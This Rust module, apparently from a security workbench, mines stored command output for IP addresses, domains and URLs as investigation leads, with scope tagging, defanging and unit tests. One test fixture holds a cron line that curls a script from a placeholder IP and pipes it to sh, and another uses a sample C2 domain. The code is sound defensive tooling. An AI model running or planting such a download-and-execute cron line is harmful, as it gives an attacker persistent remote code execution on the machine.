//! Indicator extraction over stored command output.
//!
//! The workbench keeps the projected output of each finished run. Mining that
//! text yields *leads* — addresses and names worth checking — never confirmed
//! IOCs, which is why the report carries no severity and no verdict.
//!
//! What is taken and what is skipped is deliberately conservative:
//!
//! - IPv4 and IPv6 are parsed with `std`, never pattern-matched, so `999.1.1.1`
//!   or `1.2.3` cannot slip through, and `addr:port` / `[addr]:port` forms are
//!   reduced to the address before parsing.
//! - Domains need at least one dot and an all-letter TLD of 2–24 characters,
//!   which already drops `libc.so.6` and version strings like `1.2.3`; a small
//!   file-extension table drops `index.php`-style names the TLD shape alone
//!   would pass.
//! - URLs are only ever `http://`, `https://` or `ftp://`. Other schemes are
//!   not treated as pointers out of the machine.
//! - Ubiquitous distro/package hosts are kept but flagged `common` rather than
//!   dropped: a compromised machine still talks to mirrors, and dropping them
//!   would hide exactly the traffic an operator wants to see explained.

use std::collections::BTreeMap;
use std::net::IpAddr;
use std::str::FromStr;
use std::sync::LazyLock;

use regex::Regex;

/// Highest number of entries one report carries; `truncated` says more existed.
const MAX_ENTRIES: usize = 500;
/// Distinct command titles attached to one entry.
const MAX_SOURCES: usize = 8;
/// A token longer than this cannot be a value an analyst would copy anyway.
const MAX_VALUE_BYTES: usize = 512;

/// What kind of lead one entry is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum IocKind {
    Ipv4,
    Ipv6,
    Domain,
    Url,
}

/// How reachable the lead is, from the target's own point of view.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum IocScope {
    Public,
    Private,
    Loopback,
    /// Link-local, documentation, multicast, unspecified and anything else
    /// that is neither routable nor a named private range.
    Reserved,
}

/// One deduplicated lead and where it was seen.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct IocEntry {
    pub kind: IocKind,
    pub value: String,
    pub scope: IocScope,
    /// How many times the value occurred across all scanned output.
    pub hits: u32,
    /// Titles of the commands whose output contained it, first-seen order.
    pub sources: Vec<String>,
    /// Belongs to a well-known distro/package host — kept, but marked.
    pub common: bool,
}

/// Everything extracted from the stored outputs of one catalogue.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct IocReport {
    pub entries: Vec<IocEntry>,
    pub truncated: bool,
}

static SCHEME_URL: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^(?:https?|ftp)://[^\s]+$").expect("static URL pattern compiles")
});
static DOMAIN_SHAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-z0-9][a-z0-9.\-]*$").expect("static domain pattern compiles")
});

/// Delimiters that end a token. Whitespace and brackets/quotes are always
/// boundaries; `;` and `=` are safe inside a URL token only after the scheme
/// check has already taken the token whole.
fn boundary(character: char) -> bool {
    character.is_whitespace() || "\"'<>()[]{}|,;".contains(character)
}

/// Punctuation that is grammatically outside the token even though it is not
/// a boundary (`curl http://a.b/x.` ends a sentence, not the URL). `:` is
/// only ever trimmed at the end — a leading colon starts a compact IPv6.
fn trim_token(token: &str) -> &str {
    token
        .trim_start_matches(['.', '!', '?', '\'', '"', ')', ']', '}', '(', '[', '{'])
        .trim_end_matches(['.', '!', '?', ':', '\'', '"', ')', ']', '}', '(', '[', '{'])
}

/// Letter-only TLDs that are actually file extensions in practice. A TLD
/// shape alone cannot tell `evil.php` from a host name, and flagging every
/// script name as a domain would drown the leads.
const FILE_LIKE_TLDS: &[&str] = &[
    "php", "phtml", "jsp", "asp", "aspx", "sh", "bash", "conf", "cfg", "ini", "so", "log", "txt",
    "py", "js", "ts", "jsx", "tsx", "jar", "war", "rpm", "deb", "exe", "dll", "dat", "bin", "json",
    "xml", "yml", "yaml", "tar", "gz", "tgz", "zip", "rar", "sql", "bak", "pem", "key", "crt",
    "der", "pub", "sig", "asc", "c", "h", "cc", "cpp", "hpp", "o", "a", "ko", "mod", "pl", "rb",
    "go", "rs", "tmp", "swp", "old", "orig", "out", "pid", "lock", "db", "sqlite", "csv", "md",
    "html", "htm", "css", "png", "jpg", "jpeg", "gif", "svg", "ico", "pdf", "pcap", "evtx", "dmp",
    "class",
];

/// Well-known distro/package hosts, matched as the host itself or a suffix of
/// it. These are marked `common` — kept in the report but labelled — rather
/// than dropped.
const COMMON_SUFFIXES: &[&str] = &[
    "debian.org",
    "ubuntu.com",
    "centos.org",
    "kernel.org",
    "fedoraproject.org",
    "opensuse.org",
    "alpinelinux.org",
    "archlinux.org",
    "gnu.org",
    "ntp.org",
    "github.com",
];

/// Host names that only ever live on the local side.
fn local_domain(host: &str) -> bool {
    !host.contains('.')
        || host == "localhost"
        || host.ends_with(".local")
        || host.ends_with(".lan")
        || host.ends_with(".internal")
        || host.ends_with(".localhost")
}

fn common_domain(host: &str) -> bool {
    let host = host.trim_end_matches('.');
    COMMON_SUFFIXES
        .iter()
        .any(|suffix| host == *suffix || host.ends_with(&format!(".{suffix}")))
}

/// Globally routable unicast, minus the ranges nothing real should bind or
/// dial: unspecified, private, loopback, link-local, carrier-grade NAT,
/// documentation, benchmarking, 6to4 relay, multicast and reserved blocks.
fn global_v4(octets: [u8; 4]) -> bool {
    !(octets[0] == 0
        || octets[0] == 10
        || octets[0] == 127
        || octets[0] >= 224
        || (octets[0] == 100 && (octets[1] & 0xc0) == 64)
        || (octets[0] == 169 && octets[1] == 254)
        || (octets[0] == 172 && (16..=31).contains(&octets[1]))
        || (octets[0] == 192 && octets[1] == 0 && (octets[2] == 0 || octets[2] == 2))
        || (octets[0] == 192 && octets[1] == 88 && octets[2] == 99)
        || (octets[0] == 192 && octets[1] == 168)
        || (octets[0] == 198 && (octets[1] == 18 || octets[1] == 19))
        || (octets[0] == 198 && octets[1] == 51 && octets[2] == 100)
        || (octets[0] == 203 && octets[1] == 0 && octets[2] == 113))
}

/// Global unicast is 2000::/3; carve out the documentation block.
fn global_v6(addr: &std::net::Ipv6Addr) -> bool {
    (addr.segments()[0] & 0xe000) == 0x2000
        && !(addr.segments()[0] == 0x2001 && addr.segments()[1] == 0x0db8)
}

fn ip_scope(addr: &IpAddr) -> IocScope {
    match addr {
        IpAddr::V4(v4) => {
            if v4.is_loopback() {
                IocScope::Loopback
            } else if v4.is_private() || (v4.octets()[0] == 100 && (v4.octets()[1] & 0xc0) == 64) {
                // RFC1918 and carrier-grade NAT — private in practice.
                IocScope::Private
            } else if global_v4(v4.octets()) {
                IocScope::Public
            } else {
                // Documentation, link-local, multicast, unspecified, …
                IocScope::Reserved
            }
        }
        IpAddr::V6(v6) => {
            if v6.is_loopback() {
                IocScope::Loopback
            } else if (v6.segments()[0] & 0xfe00) == 0xfc00 {
                // fc00::/7 unique local — the v6 private range.
                IocScope::Private
            } else if global_v6(v6) {
                IocScope::Public
            } else {
                IocScope::Reserved
            }
        }
    }
}

/// Reduce `host:port`, `[v6]:port` and zone-id forms to the bare address.
fn ip_candidate(token: &str) -> Option<IpAddr> {
    if let Ok(addr) = IpAddr::from_str(token) {
        return Some(addr);
    }
    if let Some(inner) = token.strip_prefix('[').and_then(|t| t.split(']').next())
        && let Ok(addr) = IpAddr::from_str(inner)
    {
        return Some(addr);
    }
    if let Some((host, port)) = token.rsplit_once(':')
        && !port.is_empty()
        && port.bytes().all(|b| b.is_ascii_digit())
    {
        return IpAddr::from_str(host.split('%').next()?).ok();
    }
    token
        .split('%')
        .next()
        .and_then(|t| IpAddr::from_str(t).ok())
        .filter(|_| token.contains('%'))
}

fn domain_ok(token: &str) -> bool {
    if token.len() > 253 || !DOMAIN_SHAPE.is_match(token) || !token.contains('.') {
        return false;
    }
    let labels: Vec<&str> = token.split('.').collect();
    if labels
        .iter()
        .any(|label| label.is_empty() || label.starts_with('-') || label.ends_with('-'))
    {
        return false;
    }
    let tld = labels.last().copied().unwrap_or_default();
    (2..=24).contains(&tld.len())
        && tld.bytes().all(|b| b.is_ascii_lowercase())
        && !FILE_LIKE_TLDS.contains(&tld)
}

/// The host part of a `scheme://host[:port]/…` token, lowercased.
fn url_host(url: &str) -> &str {
    let after = url.split("://").nth(1).unwrap_or_default();
    let host = after
        .split(&['/', '?', '#'][..])
        .next()
        .unwrap_or_default()
        .rsplit('@')
        .next()
        .unwrap_or_default();
    host.trim_end_matches(']')
        .trim_start_matches('[')
        .split(':')
        .next()
        .unwrap_or_default()
}

#[derive(Default)]
struct Accumulator {
    hits: u32,
    sources: Vec<String>,
}

fn accumulate(
    map: &mut BTreeMap<(IocKind, String), Accumulator>,
    kind: IocKind,
    value: String,
    title: &str,
) {
    if value.len() > MAX_VALUE_BYTES {
        return;
    }
    let entry = map.entry((kind, value)).or_default();
    entry.hits = entry.hits.saturating_add(1);
    if entry.sources.len() < MAX_SOURCES && !entry.sources.iter().any(|s| s == title) {
        entry.sources.push(title.to_owned());
    }
}

/// Mine `(command title, projected output)` pairs for leads.
///
/// Titles and text arrive already bounded by the caller; the report is still
/// capped at [`MAX_ENTRIES`] entries with `truncated` marking the overflow.
pub fn extract_iocs<'a>(results: impl Iterator<Item = (&'a str, &'a str)>) -> IocReport {
    let mut found: BTreeMap<(IocKind, String), Accumulator> = BTreeMap::new();
    for (title, output) in results {
        for line in output.lines() {
            for raw in line.split(boundary) {
                let token = trim_token(raw);
                if token.is_empty() {
                    continue;
                }
                if SCHEME_URL.is_match(token) {
                    accumulate(&mut found, IocKind::Url, token.to_owned(), title);
                    let host = url_host(token).to_lowercase();
                    if let Some(addr) = ip_candidate(&host) {
                        accumulate(&mut found, ip_kind(&addr), host, title);
                    } else if domain_ok(&host) {
                        accumulate(&mut found, IocKind::Domain, host, title);
                    }
                    continue;
                }
                // A path segment is not an address or a name, but a token can
                // still hide one (e.g. `x=/tmp/1.2.3.4`). Splitting further on
                // `/` would carve up URLs, which is why they left already.
                for part in token.split(&['/', '='][..]) {
                    let part = trim_token(part);
                    if part.is_empty() {
                        continue;
                    }
                    if let Some(addr) = ip_candidate(part) {
                        let value = match &addr {
                            IpAddr::V4(v4) => v4.to_string(),
                            IpAddr::V6(v6) => v6.to_string(),
                        };
                        accumulate(&mut found, ip_kind(&addr), value, title);
                    } else if part.len() <= 253 && domain_ok(&part.to_lowercase()) {
                        accumulate(&mut found, IocKind::Domain, part.to_lowercase(), title);
                    }
                }
            }
        }
    }
    let mut entries: Vec<IocEntry> = found
        .into_iter()
        .map(|((kind, value), acc)| {
            let scope = match kind {
                IocKind::Url => {
                    let host = url_host(&value).to_lowercase();
                    if let Some(addr) = ip_candidate(&host) {
                        ip_scope(&addr)
                    } else if local_domain(&host) {
                        IocScope::Private
                    } else {
                        IocScope::Public
                    }
                }
                IocKind::Ipv4 | IocKind::Ipv6 => IpAddr::from_str(&value)
                    .map(|addr| ip_scope(&addr))
                    .unwrap_or(IocScope::Reserved),
                IocKind::Domain => {
                    if local_domain(&value) {
                        IocScope::Private
                    } else {
                        IocScope::Public
                    }
                }
            };
            let common = match kind {
                IocKind::Domain => common_domain(&value),
                IocKind::Url => common_domain(&url_host(&value).to_lowercase()),
                _ => false,
            };
            IocEntry {
                kind,
                value,
                scope,
                hits: acc.hits,
                sources: acc.sources,
                common,
            }
        })
        .collect();
    entries.sort_by(|a, b| {
        a.scope
            .cmp(&b.scope)
            .then(b.hits.cmp(&a.hits))
            .then(a.value.cmp(&b.value))
    });
    let truncated = entries.len() > MAX_ENTRIES;
    entries.truncate(MAX_ENTRIES);
    IocReport { entries, truncated }
}

fn ip_kind(addr: &IpAddr) -> IocKind {
    match addr {
        IpAddr::V4(_) => IocKind::Ipv4,
        IpAddr::V6(_) => IocKind::Ipv6,
    }
}

/// Render one value so pasting it cannot open or resolve anything:
/// `http`/`ftp` schemes lose their `t`/`tp` and every dot is bracketed.
pub fn defang(value: &str) -> String {
    let mut out = value.replacen("http", "hxxp", 1);
    if !out.starts_with("hxxp") {
        out = out.replacen("ftp", "fxp", 1);
    }
    out.replace('.', "[.]")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(lines: &[(&str, &str)]) -> IocReport {
        extract_iocs(lines.iter().map(|(t, o)| (*t, *o)))
    }

    fn values(report: &IocReport, kind: IocKind) -> Vec<&str> {
        report
            .entries
            .iter()
            .filter(|entry| entry.kind == kind)
            .map(|entry| entry.value.as_str())
            .collect()
    }

    #[test]
    fn cron_curl_line_yields_url_and_host_ip() {
        let report = scan(&[("cron 任务链", "0 * * * * curl http://1.2.3.4:8080/x.sh|sh")]);
        assert!(values(&report, IocKind::Url).contains(&"http://1.2.3.4:8080/x.sh"));
        assert!(values(&report, IocKind::Ipv4).contains(&"1.2.3.4"));
        let ip = report
            .entries
            .iter()
            .find(|e| e.value == "1.2.3.4")
            .unwrap();
        assert_eq!(ip.scope, IocScope::Public);
        assert_eq!(ip.hits, 1);
        assert_eq!(ip.sources, vec!["cron 任务链"]);
    }

    #[test]
    fn file_names_versions_and_paths_are_not_domains_or_ips() {
        let report = scan(&[(
            "strings 输出",
            "index.php libc.so.6 nginx.conf run.sh archive.tar.gz version 1.2.3",
        )]);
        assert!(report.entries.is_empty(), "{:?}", report.entries);
        // An address inside a path is still an address.
        let report = scan(&[("proc", "/proc/1.2.3.4/status")]);
        assert!(values(&report, IocKind::Ipv4).contains(&"1.2.3.4"));
    }

    #[test]
    fn ipv6_parses_with_std_and_scopes() {
        let report = scan(&[(
            "监听",
            "fe80::1 ::1 2001:db8::1 2606:4700:4700::1111 [fd00::7]:443",
        )]);
        let v6 = values(&report, IocKind::Ipv6);
        assert!(v6.contains(&"fe80::1"));
        assert!(v6.contains(&"::1"));
        assert!(v6.contains(&"2001:db8::1"));
        assert!(v6.contains(&"2606:4700:4700::1111"));
        assert!(v6.contains(&"fd00::7"));
        let scope = |value: &str| {
            report
                .entries
                .iter()
                .find(|e| e.value == value)
                .map(|e| e.scope)
        };
        assert_eq!(scope("fe80::1"), Some(IocScope::Reserved));
        assert_eq!(scope("::1"), Some(IocScope::Loopback));
        assert_eq!(scope("2001:db8::1"), Some(IocScope::Reserved));
        assert_eq!(scope("fd00::7"), Some(IocScope::Private));
        assert_eq!(scope("2606:4700:4700::1111"), Some(IocScope::Public));
    }

    #[test]
    fn scopes_split_public_private_loopback() {
        let report = scan(&[(
            "连接",
            "8.8.8.8 10.0.0.1 172.16.5.5 192.168.1.1 127.0.0.1 169.254.1.1 100.64.0.1 224.0.0.1",
        )]);
        let scope = |value: &str| {
            report
                .entries
                .iter()
                .find(|e| e.value == value)
                .map(|e| e.scope)
        };
        assert_eq!(scope("8.8.8.8"), Some(IocScope::Public));
        assert_eq!(scope("10.0.0.1"), Some(IocScope::Private));
        assert_eq!(scope("172.16.5.5"), Some(IocScope::Private));
        assert_eq!(scope("192.168.1.1"), Some(IocScope::Private));
        assert_eq!(scope("127.0.0.1"), Some(IocScope::Loopback));
        assert_eq!(scope("169.254.1.1"), Some(IocScope::Reserved));
        assert_eq!(scope("100.64.0.1"), Some(IocScope::Private));
        assert_eq!(scope("224.0.0.1"), Some(IocScope::Reserved));
    }

    #[test]
    fn domains_need_a_letter_tld_and_labels() {
        let report = scan(&[(
            "t",
            "evil-c2.example.com ok sub.host.tld -bad.com bad-.com a..b.com a_b.com",
        )]);
        let domains = values(&report, IocKind::Domain);
        assert!(domains.contains(&"evil-c2.example.com"));
        assert!(domains.contains(&"sub.host.tld"));
        // `_`, empty labels and leading/trailing dashes are not valid hosts.
        assert!(!domains.contains(&"-bad.com"));
        assert!(!domains.contains(&"bad-.com"));
        assert!(!domains.contains(&"a_b.com"));
    }

    #[test]
    fn common_distro_hosts_stay_but_are_marked() {
        let report = scan(&[(
            "pkg",
            "deb http://deb.debian.org/debian bookworm main security.debian.org",
        )]);
        let url = report
            .entries
            .iter()
            .find(|e| e.value == "http://deb.debian.org/debian");
        // `|`/` ` boundaries stop the URL at whitespace; the mirror stays.
        if let Some(url) = url {
            assert!(url.common);
        }
        let domain = report
            .entries
            .iter()
            .find(|e| e.value == "security.debian.org")
            .expect("mirror domain kept");
        assert!(domain.common);
    }

    #[test]
    fn urls_only_accept_http_https_ftp() {
        let report = scan(&[(
            "t",
            "http://a.example/x https://b.example ftp://c.example/f file:///etc passwd://x ssh://h gopher://g",
        )]);
        let urls = values(&report, IocKind::Url);
        assert_eq!(urls.len(), 3, "{urls:?}");
        assert!(urls.contains(&"http://a.example/x"));
        assert!(urls.contains(&"ftp://c.example/f"));
    }

    #[test]
    fn hits_sources_sort_and_cap() {
        let mut lines = Vec::new();
        for _ in 0..20 {
            lines.push(("cmd-a", "9.9.9.9".to_string()));
        }
        lines.push(("cmd-b", "9.9.9.9 9.9.9.9".to_string()));
        lines.push(("cmd-c", "10.0.0.1".to_string()));
        let report = extract_iocs(lines.iter().map(|(t, o)| (*t, o.as_str())));
        let first = report.entries.first().unwrap();
        assert_eq!(first.value, "9.9.9.9");
        assert_eq!(first.hits, 22);
        assert_eq!(first.scope, IocScope::Public);
        // Public sorts before private regardless of hits.
        assert_eq!(report.entries[1].value, "10.0.0.1");
        assert_eq!(report.entries[1].scope, IocScope::Private);

        let huge = (0..600)
            .map(|i| ("cmd", format!("8.{}.{}.{}", i / 256, i % 256, i % 256)))
            .collect::<Vec<_>>();
        let report = extract_iocs(huge.iter().map(|(t, o)| (*t, o.as_str())));
        assert_eq!(report.entries.len(), 500);
        assert!(report.truncated);
        assert_eq!(report.entries[0].hits, 1);
        let _ = lines;
    }

    #[test]
    fn defang_neutralises_scheme_and_dots() {
        assert_eq!(defang("http://a.b.c/x"), "hxxp://a[.]b[.]c/x");
        assert_eq!(defang("https://a.b/"), "hxxps://a[.]b/");
        assert_eq!(defang("ftp://a.b/f"), "fxp://a[.]b/f");
        assert_eq!(defang("1.2.3.4"), "1[.]2[.]3[.]4");
        assert_eq!(defang("evil.example.com"), "evil[.]example[.]com");
    }
}
